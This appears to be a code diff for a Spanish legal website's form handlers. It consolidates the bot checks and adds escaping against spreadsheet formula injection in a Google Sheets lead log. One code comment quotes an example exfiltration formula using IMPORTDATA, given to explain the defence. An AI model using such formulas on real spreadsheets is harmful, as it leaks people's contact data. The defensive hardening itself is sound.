@@ -34,6 +34,23 @@ const contactSchema = z.object({
 
 const MIN_FILL_TIME_MS = 3000;
 
+/** Honeypot relleno, formulario enviado demasiado rápido o sin marca de tiempo
+ *  (todos los formularios legítimos de la web la envían): probablemente un bot. */
+function looksLikeBot(data: { website: string; formLoadedAt?: number }): boolean {
+  if (data.website.length > 0) return true;
+  if (typeof data.formLoadedAt !== "number") return true;
+  return Date.now() - data.formLoadedAt < MIN_FILL_TIME_MS;
+}
+
+/** Google Sheets interpreta como fórmula cualquier texto que empiece por = + - @.
+ *  Sin esto, un mensaje como =IMPORTDATA("https://…"&A2:G99) se ejecutaría al abrir
+ *  la hoja de leads y podría sacar datos de ella. El apóstrofo inicial fuerza texto
+ *  y Sheets no lo muestra. */
+function safeCell(value: string | undefined): string {
+  const v = value ?? "";
+  return /^[=+\-@\t\r]/.test(v) ? `'${v}` : v;
+}
+
 const downloadLeadSchema = z.object({
   email: z.string().trim().email().max(255),
   topic: z.string().trim().min(1).max(100),
@@ -47,9 +64,7 @@ const downloadLeadSchema = z.object({
 export const submitDownloadLead = createServerFn({ method: "POST" })
   .inputValidator((input) => downloadLeadSchema.parse(input))
   .handler(async ({ data }) => {
-    const isHoneypotFilled = data.website.length > 0;
-    const isTooFast = typeof data.formLoadedAt === "number" && Date.now() - data.formLoadedAt < MIN_FILL_TIME_MS;
-    if (isHoneypotFilled || isTooFast) {
+    if (looksLikeBot(data)) {
       return { success: true };
     }
 
@@ -67,9 +82,9 @@ export const submitDownloadLead = createServerFn({ method: "POST" })
         sheetUrl: GOOGLE_SHEET_URL,
         name: "",
         phone: "",
-        email: data.email,
-        interest: data.topic,
-        topic: data.topic,
+        email: safeCell(data.email),
+        interest: safeCell(data.topic),
+        topic: safeCell(data.topic),
         message: "Descarga de informe desde una herramienta web.",
         origin: "Web HiloLegal — Descarga de informe",
       }),
@@ -91,9 +106,7 @@ export const submitContact = createServerFn({ method: "POST" })
     // Honeypot relleno o formulario enviado demasiado rápido: probablemente
     // un bot. Se responde éxito aparente sin revelar la detección, pero no
     // se reenvía a ningún destino real.
-    const isHoneypotFilled = data.website.length > 0;
-    const isTooFast = typeof data.formLoadedAt === "number" && Date.now() - data.formLoadedAt < MIN_FILL_TIME_MS;
-    if (isHoneypotFilled || isTooFast) {
+    if (looksLikeBot(data)) {
       return { success: true };
     }
 
@@ -109,12 +122,12 @@ export const submitContact = createServerFn({ method: "POST" })
         sheetId: GOOGLE_SHEET_ID,
         sheetName: GOOGLE_SHEET_NAME,
         sheetUrl: GOOGLE_SHEET_URL,
-        name: data.name,
-        phone: data.phone,
-        email: data.email,
-        interest: data.topic,
-        topic: data.topic,
-        message: data.message,
+        name: safeCell(data.name),
+        phone: safeCell(data.phone),
+        email: safeCell(data.email),
+        interest: safeCell(data.topic),
+        topic: safeCell(data.topic),
+        message: safeCell(data.message),
         origin: "Web HiloLegal",
       }),
     });
